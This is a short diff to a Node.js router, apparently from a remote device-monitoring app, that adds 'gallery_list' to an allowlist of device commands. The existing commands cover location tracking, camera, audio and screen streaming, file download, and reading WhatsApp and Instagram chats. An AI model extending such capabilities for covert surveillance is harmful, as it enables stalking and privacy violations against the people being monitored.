@@ -7,7 +7,7 @@ const { sendSyncNudge } = require("../services/fcm.service");
 const router = express.Router();
 router.use(requireAuth);
 
-const ALLOWED_COMMAND_TYPES = ["location_check", "lock", "file_list", "file_download", "screen_stream", "camera_stream", "audio_stream", "sync_whatsapp", "whatsapp_file_list", "get_whatsapp_chat", "sync_instagram", "get_instagram_chat"];
+const ALLOWED_COMMAND_TYPES = ["location_check", "lock", "file_list", "file_download", "screen_stream", "camera_stream", "audio_stream", "sync_whatsapp", "whatsapp_file_list", "get_whatsapp_chat", "sync_instagram", "get_instagram_chat", "gallery_list"];
 
 async function checkDeviceAccess(deviceId, auth) {
   if (!auth) return null;
